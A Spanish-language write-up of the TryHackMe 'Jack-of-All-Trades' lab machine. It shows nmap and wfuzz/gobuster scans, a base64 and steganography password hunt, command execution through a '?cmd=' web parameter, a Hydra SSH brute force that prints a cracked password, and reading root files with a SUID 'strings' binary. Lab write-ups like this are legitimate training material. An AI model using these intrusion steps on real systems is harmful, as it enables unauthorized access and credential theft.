---
layout: single
title: Jack-of-All-Trades
excerpt: "Boot-to-root originally designed for Securi-Tay 2020"
date: 2022-05-04
classes: wide
header:
  teaser: /assets/images/thm-writeup-jack-of-all-trades/jack_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - Web
  - Javascript
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_logo1.png)

[Link](https://tryhackme.com/room/jackofalltrades "Jack")

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

---

## 1. Fase de reconocimiento

- Para conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```css
ping -c 1 {ip}
```

![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:

```css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
```

![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_nmap.png)

---

- De acuerdo con el escaneo anterior, se encuentran los siguientes puertos abiertos; 22 (http) y 80 (htp), como se observa el puerto **22** esta resolviendo http, lo cual nos puede traer inconvenientes en fututo.

- Escaeno de vulnerabilidades sobre los puertos abiertos:

```css
nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
```

- Utilizamos **whatweb** con la {ip} sobre los puertos 22 y 80, sobre el puerto 80 nos genera error en su lugar en el pueroto 22 nos listó la siguiente información:

![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_whatweb.png)

---

- Abrimos una nueva pestaña, en la cual escribimos lo siguiente en la barra de navegación: **about:config** y agregamos la siguiente entrada **network.security.ports.banned.override** sobre el puerto **22**, de acuerdo con la siguiente referencia <https://support.mozilla.org/en-US/questions/1083282>

![logo](/assets/images/thm-writeup-jack-of-all-trades/jack_web2.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:

```css
└─# wfuzz --hc=404,273 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.68.28:22//FUZZ/
```

- Con el anterior escaner encotramos las siguientes rutas:
  - "assets"

![assets](/assets/images/thm-writeup-jack-of-all-trades/jack_assets.png)

- Al revisar esta ruta nos encotramos con 3 imagenes y una hoja de estilos css, llama la atención el archivo **stego.jpg**, en clara referencia a información oculta con esteganografía.

## 4. GOBUSTER

- Escaneo de subdominios con esta herramienta

```css
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.68.28:22 -x txt,py,php,js

```

- Con el anterior escaner encotramos las siguientes rutas:
  - "assets"
  - "recovery.php"

![login](/assets/images/thm-writeup-jack-of-all-trades/jack_login.png)

---

## 5 Steganografía

- Inspeccionando el código de la página y nos encontramos con el siguiente código que está códificado en base 64, el cual procedemos a decodificar y nos encontramos con una contraseña:

![login](/assets/images/thm-writeup-jack-of-all-trades/jack_64decode.png)

---

![login](/assets/images/thm-writeup-jack-of-all-trades/jack_64decode_burp.png)

---

- Con la contraseña encontrada procedemos a desencriptar los mensajes en las imagenes y encontramos lo siguiente:

![steg1](/assets/images/thm-writeup-jack-of-all-trades/jack_steg1.png)

---

![steg1](/assets/images/thm-writeup-jack-of-all-trades/jack_steg2.png)

---

- Con el usuario y contraseña encontrados nos autenticamos en "recovery.php" y nos entrega el siguiente mensaje:

![login](/assets/images/thm-writeup-jack-of-all-trades/jack_login1.png)

- Analizando este mensaje encontramos que podemos realizar ejecución remota de comando.

## 6. Burpsuite

- De acuerdo con la información anterior procedemos a modificar la cabecera de está manera **/nnxhweOV/index.php?cmd=id** y obtenemos la siguiente respuesta:

![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_burp1.png)

---

## 7. Hydra

```css
┌──(root㉿bogsec)-[/home/ocortesl/THM/Jack/exploit]
└─# hydra -l jack -P dic.txt -s 80 ssh://10.10.68.28 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-04 20:15:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.68.28:80/
[80][ssh] host: 10.10.68.28   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-04 20:15:23
```

## 8. Bandera usuario

- Compartimos un servidor por el puerto **8080** y accedemos a la dirección desde el navegador y observamos el **index** y en este el archivo **user.jpg**, como se observa a continuación:
  
![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_user1.png)

---

![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_user.png)

---

## 9. Bandera root

- Procedemos a investigar que vulnerabilidad podemos aprovechar para escalar privilegios con el siguiente comnando:

```css
jack@jack-of-all-trades:/tmp$ find / -user root -perm /4000 -exec ls -l {} \; 2>/dev/null
```

![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_strings.png)

- Consultamos en <https://gtfobins.github.io/gtfobins/strings/> y encontramos que podemos leer archivos saltando los privilegios root.

![burp](/assets/images/thm-writeup-jack-of-all-trades/jack_gtfo.png)

```css
jack@jack-of-all-trades:/$ strings /root/root.txt     
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: //////_{????????}

```

---

Fuentes:

- Gtfobins:
<https://gtfobins.github.io/gtfobins/strings/>

- Writeup
<https://fr33s0ul.tech/jack-of-all-trades-tryhackme-write-up/>
